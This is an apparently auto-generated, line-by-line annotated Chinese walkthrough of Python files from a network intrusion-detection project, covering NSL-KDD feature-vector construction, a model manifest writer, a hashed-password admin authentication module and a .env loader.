| 125 | 返回结果：把处理后的值交回调用方。 | `                return 0.0` |
| 126 | 返回结果：把处理后的值交回调用方。 | `            return float(x)` |
| 127 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (TypeError, ValueError):` |
| 128 | 返回结果：把处理后的值交回调用方。 | `            return 0.0` |
| 129 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 130 | 装饰器：为下面的函数或类附加框架行为。 | `    @classmethod` |
| 131 | 函数定义：声明 `build_vector_in_order` 的输入、处理逻辑和返回结果。 | `    def build_vector_in_order(` |
| 132 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cls,` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        features: Mapping[str, Any],` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feature_columns: Sequence[str],` |
| 135 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Tuple[List[float], Dict[str, Any]]:` |
| 136 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 137 | 代码语句：参与当前文件的业务流程或数据处理。 | `        按 \`\`feature_columns\`\` 顺序构造一行 NSL 风格数值向量（用于与训练矩阵对齐）。` |
| 138 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 139 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 140 | 函数调用：执行已有函数/方法完成当前步骤。 | `            (row, audit) audit 含 \`\`zero_filled_columns\`\`、\`\`mapped_from_flow\`\`。` |
| 141 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flat = _flatten_network_flow_features(features)` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row: List[float] = []` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        zero_filled: List[str] = []` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mapped_from_flow: Dict[str, Any] = {}` |
| 146 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 147 | 循环：逐个处理集合或迭代器中的元素。 | `        for col in feature_columns:` |
| 148 | 条件判断：满足条件时进入对应分支。 | `            if col not in NSL_KDD_FEATURE_COLUMNS:` |
| 149 | 抛出异常：主动报告不可继续的错误。 | `                raise ValueError(f"未知 NSL 特征列: {col!r}")` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 条件判断：满足条件时进入对应分支。 | `            if col in _MAPPABLE_FROM_FLOW:` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                src_f = _MAPPABLE_FROM_FLOW[col]` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                val = flat.get(src_f)` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                num = cls._float(val)` |
| 155 | 函数调用：执行已有函数/方法完成当前步骤。 | `                row.append(num)` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                mapped_from_flow[col] = {"from": src_f, "value": num}` |
| 157 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 158 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 159 | 条件判断：满足条件时进入对应分支。 | `            if col in _CONSTANT_ZERO:` |
| 160 | 函数调用：执行已有函数/方法完成当前步骤。 | `                row.append(float(_CONSTANT_ZERO[col]))` |
| 161 | 函数调用：执行已有函数/方法完成当前步骤。 | `                zero_filled.append(col)` |
| 162 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 163 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 164 | 条件判断：满足条件时进入对应分支。 | `            if col in _CATEGORICAL_NSL_NO_ONLINE_ENCODING:` |
| 165 | 函数调用：执行已有函数/方法完成当前步骤。 | `                row.append(0.0)` |
| 166 | 函数调用：执行已有函数/方法完成当前步骤。 | `                zero_filled.append(f"{col}(categorical_no_encoder)")` |
| 167 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 168 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 169 | 函数调用：执行已有函数/方法完成当前步骤。 | `            row.append(0.0)` |
| 170 | 函数调用：执行已有函数/方法完成当前步骤。 | `            zero_filled.append(f"{col}(kdd_host_stat_unavailable)")` |
| 171 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        audit = {` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "adapter": "nsl_kdd_v1",` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "zero_filled_columns": zero_filled,` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "mapped_from_flow": mapped_from_flow,` |
| 176 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 177 | 返回结果：把处理后的值交回调用方。 | `        return row, audit` |

## `src/schema/persist.py`

- 类型：数据结构/Schema
- 行数：61

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""训练侧写入 \`\`*.model_manifest.json\`\`。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 6 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timezone` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, List, Mapping, Optional` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from .manifest import manifest_path_for_model_file` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 函数定义：声明 `write_model_manifest` 的输入、处理逻辑和返回结果。 | `def write_model_manifest(` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_path: str,` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 15 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_name: str,` |
| 16 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    version: str,` |
| 17 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    schema_name: str,` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    schema_version: str,` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feature_columns: List[str],` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    training_dataset: str,` |
| 21 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    metrics: Mapping[str, Any],` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    artifact_files: Mapping[str, str],` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: Optional[str] = None,` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    trust_tier: str = "production",` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    adapter: Optional[str] = None,` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_input_mode: str = "tabular",` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    extra: Optional[Mapping[str, Any]] = None,` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> str:` |
| 29 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 30 | 代码语句：参与当前文件的业务流程或数据处理。 | `    写入 \`\`{stem}.model_manifest.json\`\` 到模型同目录。` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Returns:` |
| 33 | 代码语句：参与当前文件的业务流程或数据处理。 | `        写入的 manifest 绝对路径。` |
| 34 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload: Dict[str, Any] = {` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_name": model_name,` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "version": version,` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "schema_name": schema_name,` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "schema_version": schema_version,` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "feature_columns": list(feature_columns),` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "training_dataset": training_dataset,` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "metrics": dict(metrics),` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "created_at": created_at` |
| 44 | 函数调用：执行已有函数/方法完成当前步骤。 | `        or datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "artifact_files": dict(artifact_files),` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "trust_tier": trust_tier,` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_input_mode": model_input_mode,` |
| 48 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 49 | 条件判断：满足条件时进入对应分支。 | `    if adapter is not None:` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload["adapter"] = adapter` |
| 51 | 条件判断：满足条件时进入对应分支。 | `    if extra:` |
| 52 | 循环：逐个处理集合或迭代器中的元素。 | `        for k, v in extra.items():` |
| 53 | 条件判断：满足条件时进入对应分支。 | `            if k not in payload:` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                payload[k] = v` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    out = manifest_path_for_model_file(model_path)` |
| 57 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.makedirs(os.path.dirname(out), exist_ok=True)` |
| 58 | 上下文管理：自动管理资源打开与释放。 | `    with open(out, "w", encoding="utf-8") as f:` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `        json.dump(payload, f, ensure_ascii=False, indent=2)` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `        f.write("\n")` |
| 61 | 返回结果：把处理后的值交回调用方。 | `    return out` |

## `src/utils/__init__.py`

- 类型：通用工具
- 行数：1

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""Package initializer."""` |

## `src/utils/auth.py`

- 类型：通用工具
- 行数：156

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `管理员认证辅助模块（Phase 8：消除明文密码）` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `核心目标：` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 生产环境优先使用 ADMIN_PASSWORD_HASH（Werkzeug 安全哈希）` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 明文 ADMIN_PASSWORD 仅作为向后兼容的兜底，命中即发出安全警告` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 所有比较走常量时间函数（werkzeug.security.check_password_hash 内置），` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `      避免通过响应时间侧信道泄漏密码信息` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `为什么选 Werkzeug 而不是 bcrypt?` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - Werkzeug 是 Flask 的硬依赖，无需新增 runtime 包，降低部署门槛` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 默认算法 \`pbkdf2:sha256:600000\`（16 字节盐）已达 OWASP 2023 推荐强度` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 若用户希望更强的 bcrypt，可在环境变量直接传入形如 \`bcrypt$...\` 的哈希，` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `      Werkzeug 支持解析多种前缀（pbkdf2 / scrypt；bcrypt 需装 \`passlib\`）。` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `      本模块保留扩展点：若安装了 \`passlib[bcrypt]\`，会自动识别 \`bcrypt$\` / \`$2b$\` 前缀` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `对外接口：` |
| 18 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - verify_admin_credentials(username, password) -> bool` |
| 19 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - hash_password(password) -> str                 生成哈希（脚本使用）` |
| 20 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - is_hash_configured() -> bool                   判断是否已配置哈希` |
| 21 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 22 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import hmac` |
| 25 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 26 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 27 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Optional` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 导入对象：从指定模块引入类、函数或常量。 | `from werkzeug.security import check_password_hash, generate_password_hash` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 注释：解释下面或当前这段代码的设计意图。 | `#: 默认哈希算法（与 OWASP 2023 建议对齐）` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DEFAULT_ALGORITHM: str = "pbkdf2:sha256:600000"` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 注释：解释下面或当前这段代码的设计意图。 | `#: 未修改的默认明文密码（命中即高风险告警）` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_WEAK_DEFAULT_PASSWORDS = frozenset({"changeme", "admin", "password", "123456"})` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 注释：解释下面或当前这段代码的设计意图。 | `#: 本模块内部缓存：同一进程内只警告一次"使用明文密码"` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_plaintext_warned: bool = False` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 注释：解释下面或当前这段代码的设计意图。 | `# ---------------------------------------------------------------------` |
| 44 | 注释：解释下面或当前这段代码的设计意图。 | `# 对外 API` |
| 45 | 注释：解释下面或当前这段代码的设计意图。 | `# ---------------------------------------------------------------------` |
| 46 | 函数定义：声明 `is_hash_configured` 的输入、处理逻辑和返回结果。 | `def is_hash_configured() -> bool:` |
| 47 | 文档字符串：说明当前模块、类或函数的职责。 | `    """是否已配置 ADMIN_PASSWORD_HASH。"""` |
| 48 | 返回结果：把处理后的值交回调用方。 | `    return bool((os.environ.get("ADMIN_PASSWORD_HASH") or "").strip())` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 函数定义：声明 `hash_password` 的输入、处理逻辑和返回结果。 | `def hash_password(password: str, algorithm: str = _DEFAULT_ALGORITHM) -> str:` |
| 52 | 文档字符串：说明当前模块、类或函数的职责。 | `    """生成管理员密码哈希（供 scripts/generate_admin_password_hash.py 调用）。` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Args:` |
| 55 | 占位语句：保持语法完整但当前不执行操作。 | `        password: 明文密码；调用方自行保证已做长度 / 强度校验。` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        algorithm: 哈希算法，默认 pbkdf2:sha256:600000。` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Returns:` |
| 59 | 代码语句：参与当前文件的业务流程或数据处理。 | `        形如 \`\`pbkdf2:sha256:600000$saltXXXX$hashYYY\`\` 的字符串，` |
| 60 | 代码语句：参与当前文件的业务流程或数据处理。 | `        可直接写入 \`.env\` 的 \`\`ADMIN_PASSWORD_HASH\`\`。` |
| 61 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 62 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(password, str) or not password:` |
| 63 | 抛出异常：主动报告不可继续的错误。 | `        raise ValueError("密码必须为非空字符串")` |
| 64 | 返回结果：把处理后的值交回调用方。 | `    return generate_password_hash(password, method=algorithm)` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 函数定义：声明 `verify_admin_credentials` 的输入、处理逻辑和返回结果。 | `def verify_admin_credentials(username: str, password: str) -> bool:` |
| 68 | 文档字符串：说明当前模块、类或函数的职责。 | `    """校验管理员用户名 / 密码。` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 代码语句：参与当前文件的业务流程或数据处理。 | `    策略（按优先级）：` |
| 71 | 代码语句：参与当前文件的业务流程或数据处理。 | `        1. 生产环境（FLASK_ENV=production）：仅允许 ADMIN_PASSWORD_HASH，禁止明文兜底` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `        2. 非生产：若 ADMIN_PASSWORD_HASH 存在，使用 \`\`check_password_hash\`\` 验证` |
| 73 | 代码语句：参与当前文件的业务流程或数据处理。 | `        3. 非生产：否则退回到 ADMIN_PASSWORD 明文比对（常量时间 \`\`hmac.compare_digest\`\`）` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `           并在首次使用时打印 WARNING；弱默认密码打印 CRITICAL` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `        4. 若未配置任何凭据，拒绝登录并打印 ERROR` |
| 76 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Args:` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        username: 提交的用户名（已 strip）。` |
| 79 | 占位语句：保持语法完整但当前不执行操作。 | `        password: 提交的明文密码。` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Returns:` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        bool: True 表示凭据正确且通过。` |
| 83 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    env = (os.environ.get("FLASK_ENV") or "development").strip().lower()` |
| 85 | 条件判断：满足条件时进入对应分支。 | `    if env == "production" and not is_hash_configured():` |
| 86 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.error(` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[Auth] 生产环境未配置 ADMIN_PASSWORD_HASH，拒绝登录。"` |
| 88 | 代码语句：参与当前文件的业务流程或数据处理。 | `            " 请运行 scripts/generate_admin_password_hash.py 生成哈希。"` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 90 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 91 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    expected_user = (os.environ.get("ADMIN_USERNAME") or "admin").strip()` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    user_match = hmac.compare_digest(` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `        username.encode("utf-8"), expected_user.encode("utf-8")` |
| 95 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    hash_value = (os.environ.get("ADMIN_PASSWORD_HASH") or "").strip()` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    plaintext = os.environ.get("ADMIN_PASSWORD")` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 注释：解释下面或当前这段代码的设计意图。 | `    # -- 分支 1：配置了哈希 ------------------------------------------` |
| 101 | 条件判断：满足条件时进入对应分支。 | `    if hash_value:` |
| 102 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pwd_match = check_password_hash(hash_value, password)` |
| 104 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ValueError as exc:` |
| 105 | 注释：解释下面或当前这段代码的设计意图。 | `            # 哈希格式不合法（例如写了一段随机字符串到环境变量里）` |
| 106 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error(` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[Auth] ADMIN_PASSWORD_HASH 格式非法，登录一律失败: %s", exc` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 109 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 110 | 返回结果：把处理后的值交回调用方。 | `        return bool(user_match and pwd_match)` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 注释：解释下面或当前这段代码的设计意图。 | `    # -- 分支 2：未配置哈希，仅非生产允许明文兜底 --------------------` |
| 113 | 条件判断：满足条件时进入对应分支。 | `    if plaintext is not None:` |
| 114 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _warn_plaintext_once(plaintext)` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pwd_match = hmac.compare_digest(` |
| 116 | 占位语句：保持语法完整但当前不执行操作。 | `            password.encode("utf-8"), plaintext.encode("utf-8")` |
| 117 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 118 | 返回结果：把处理后的值交回调用方。 | `        return bool(user_match and pwd_match)` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 注释：解释下面或当前这段代码的设计意图。 | `    # -- 分支 3：两者都未配置 ----------------------------------------` |
| 121 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logger.error(` |
| 122 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "[Auth] 未配置 ADMIN_PASSWORD_HASH 或 ADMIN_PASSWORD，一切登录请求都会失败。"` |
| 123 | 代码语句：参与当前文件的业务流程或数据处理。 | `        " 请通过 \`python scripts/generate_admin_password_hash.py\` 生成哈希。"` |
| 124 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 125 | 返回结果：把处理后的值交回调用方。 | `    return False` |
| 126 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 注释：解释下面或当前这段代码的设计意图。 | `# ---------------------------------------------------------------------` |
| 129 | 注释：解释下面或当前这段代码的设计意图。 | `# 内部工具` |
| 130 | 注释：解释下面或当前这段代码的设计意图。 | `# ---------------------------------------------------------------------` |
| 131 | 函数定义：声明 `_warn_plaintext_once` 的输入、处理逻辑和返回结果。 | `def _warn_plaintext_once(plaintext: str) -> None:` |
| 132 | 文档字符串：说明当前模块、类或函数的职责。 | `    """首次命中明文密码路径时打印安全警告，避免污染日志。"""` |
| 133 | 代码语句：参与当前文件的业务流程或数据处理。 | `    global _plaintext_warned` |
| 134 | 条件判断：满足条件时进入对应分支。 | `    if _plaintext_warned:` |
| 135 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _plaintext_warned = True` |
| 137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    lowered = (plaintext or "").strip().lower()` |
| 139 | 条件判断：满足条件时进入对应分支。 | `    if lowered in _WEAK_DEFAULT_PASSWORDS:` |
| 140 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.critical(` |
| 141 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[Auth] 检测到默认弱密码！请立即执行："` |
| 142 | 代码语句：参与当前文件的业务流程或数据处理。 | `            " python scripts/generate_admin_password_hash.py"` |
| 143 | 代码语句：参与当前文件的业务流程或数据处理。 | `            " 并在 .env 中设置 ADMIN_PASSWORD_HASH 后删除 ADMIN_PASSWORD。"` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 145 | 兜底分支：处理前面条件都不满足的情况。 | `    else:` |
| 146 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning(` |
| 147 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[Auth] 使用明文 ADMIN_PASSWORD 登录。生产环境请改用 ADMIN_PASSWORD_HASH"` |
| 148 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "（运行 scripts/generate_admin_password_hash.py 生成）。"` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `__all__ = [` |
| 153 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "hash_password",` |
| 154 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "is_hash_configured",` |
| 155 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "verify_admin_credentials",` |
| 156 | 代码语句：参与当前文件的业务流程或数据处理。 | `]` |

## `src/utils/env_loader.py`

- 类型：通用工具
- 行数：43

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Minimal .env loader for local script execution.` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `Docker Compose reads .env itself, but \`\`python main.py\`\` and` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `\`\`python -m web.app\`\` do not. Keep this intentionally small to avoid adding a` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `runtime dependency for simple KEY=VALUE files.` |
| 6 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 7 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 函数定义：声明 `load_dotenv_file` 的输入、处理逻辑和返回结果。 | `def load_dotenv_file(path: str \| os.PathLike[str] \| None = None) -> None:` |
| 15 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Load missing environment variables from a local .env file."""` |
| 16 | 条件判断：满足条件时进入对应分支。 | `    if os.environ.get("FLASK_ENV") == "production":` |
| 17 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 18 | 条件判断：满足条件时进入对应分支。 | `    if "pytest" in sys.modules:` |
| 19 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 20 | 条件判断：满足条件时进入对应分支。 | `    if any("pytest" in Path(arg).name.lower() for arg in sys.argv):` |
| 21 | 返回结果：把处理后的值交回调用方。 | `        return` |
